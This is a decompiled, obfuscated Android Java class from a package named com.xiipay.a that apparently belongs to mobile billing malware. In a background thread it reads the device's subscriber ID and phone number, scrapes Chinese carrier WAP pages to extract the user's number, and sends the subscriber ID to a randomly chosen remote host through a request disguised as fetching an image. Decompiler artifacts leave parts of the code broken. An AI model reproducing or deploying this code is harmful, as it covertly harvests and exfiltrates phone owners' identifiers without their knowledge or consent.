package com.xiipay.a;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;
import java.io.File;
import java.util.List;
import java.util.Map;
import java.util.Random;

public final class f
  extends Thread
{
  public static String a = "";
  private Context b;
  
  public f(Context paramContext)
  {
    this.b = paramContext;
  }
  
  private static String a(Context paramContext, String paramString1, String paramString2)
  {
    paramContext = new String(k.a(paramContext, paramString1));
    int i = paramContext.indexOf(paramString2);
    if (i != -1)
    {
      paramString1 = paramContext.substring(i + paramString2.length());
      paramContext = paramString1;
      if (paramString1.startsWith("+")) {
        paramContext = paramString1.substring(1);
      }
      paramString1 = paramContext;
      if (paramContext.startsWith("86")) {
        paramString1 = paramContext.substring(2);
      }
      if (paramString1.length() >= 11) {
        return paramString1.substring(0, 11);
      }
    }
    return null;
  }
  
  public final void run()
  {
    a = g.a(new File(this.b.getPackageResourcePath()));
    TelephonyManager localTelephonyManager = (TelephonyManager)this.b.getSystemService("phone");
    String str = localTelephonyManager.getSubscriberId();
    if ((str == null) || (str.length() != 15)) {}
    d localD;
    do
    {
      return;
      localD = new d(this.b);
    } while ((!localD.d()) || (!localD.c()));
    try
    {
      if ((String)localD.b().d().get(str) != null)
      {
        localD.f();
        return;
      }
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      return;
    }
    Object localObject1 = localException.getLine1Number();
    if ((localObject1 != null) && (((String)localObject1).length() > 0)) {
      localD.b().a(str, (String)localObject1);
    }
    localObject1 = ((ConnectivityManager)this.b.getSystemService("connectivity")).getActiveNetworkInfo();
    if ((localObject1 == null) || (!((NetworkInfo)localObject1).isAvailable()))
    {
      localD.f();
      return;
    }
    if ((((NetworkInfo)localObject1).getType() == 0) && (((NetworkInfo)localObject1).getExtraInfo().toLowerCase().indexOf("wap") != -1) && (!k.a(str)))
    {
      if (k.b(str)) {
        localObject1 = a(this.b, "http://wap.118100.cn/i/app/mycrbt/list.do?wapv=12&cc=1730", "欢迎您");
      }
      for (;;)
      {
        if (localObject1 != null) {
          localD.b().a(str, (String)localObject1);
        }
        label243:
        localD.f();
        return;
        localObject2 = a(this.b, "http://wap.12530.com/client/wl.jsp?CH=group&ut=&qd=3040&pc=bj&np=214071_214193&ty=dd&v=2960", "手机号:");
        localObject1 = localObject2;
        if (localObject2 == null) {
          localObject1 = a(this.b, "http://js.i139.cn/pams/s.do?tl=14874", "phone=");
        }
      }
    }
    localObject1 = localD.b().b();
    localObject1 = "http://" + (String)((List)localObject1).get(new Random().nextInt(((List)localObject1).size())) + "/i/l.jpg";
    Object localObject2 = localD.a();
    byte[] arrayOfByte = str.getBytes();
    if (localD.e() == 0) {}
    for (boolean bool = true;; bool = false)
    {
      localObject1 = k.a((Context)localObject2, (String)localObject1, arrayOfByte, bool);
      if (localObject1 == null) {}
      for (localObject1 = null;; localObject1 = new String((byte[])localObject1))
      {
        if (localObject1 == null) {
          break label418;
        }
        if (!((String)localObject1).startsWith("1,")) {
          break label420;
        }
        localObject1 = ((String)localObject1).substring(2);
        localD.b().a(str, (String)localObject1);
        break;
      }
      label418:
      break;
      label420:
      i.a(((String)localObject1).substring(2), "GS:" + k.c(str));
      k.b(10);
      break label243;
    }
  }
}
